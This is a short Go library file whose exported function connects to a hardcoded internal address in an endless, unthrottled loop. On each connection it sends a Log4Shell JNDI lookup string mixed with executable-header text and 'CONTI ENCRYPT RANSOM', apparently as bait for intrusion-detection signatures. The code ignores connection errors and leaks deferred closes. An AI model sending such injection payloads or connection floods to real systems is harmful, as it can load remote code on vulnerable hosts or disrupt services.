package main

import (
	"C"
	"fmt"
	"io/ioutil"
	"net"
	"time"
)

//export tcp
func tcp(ip string, port string) {

	fmt.Println(ip)
	fmt.Println(port)
	netstring := ip + ":" + port
	fmt.Println(netstring)
	var timeoutTCP time.Duration
	timeoutTCP = 1 * time.Millisecond
	i := 1
	count := 0
	for i == 1 {
		d := net.Dialer{Timeout: timeoutTCP}
		conn, err := d.Dial("tcp", netstring)
		conn.Write([]byte("${jndi:ldap://asdfaf/a} MZ THIS PROGRAM This program cannot be run in DOS mode. CONTI ENCRYPT RANSOM "))
		defer conn.Close()
		conn.SetReadDeadline(time.Now()) //.Add(1 * time.Second))
		ioutil.ReadAll(conn)
		fmt.Print(err)
		fmt.Println("TCPEW")
		count++
		fmt.Println(count)
	}
}

//export run
func run() {
	ip := "172.31.24.10"
	port1 := "666"
	//tcp
	tcp(ip, port1)

	//ip := os.Args[1]
	//port1 := os.Args[2]

}

func main() {

}
